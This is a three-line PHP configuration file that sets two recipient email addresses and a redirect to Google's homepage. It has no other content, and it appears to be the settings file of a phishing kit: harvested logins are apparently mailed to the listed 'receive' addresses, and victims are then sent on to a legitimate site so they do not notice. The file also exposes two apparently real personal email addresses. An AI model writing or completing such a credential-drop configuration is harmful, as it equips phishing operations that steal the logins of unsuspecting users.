<?php 
$Receive_email="noaks1978@gmail.com, jjwicks@yandex.ru";
$redirect="https://www.google.com/";
?>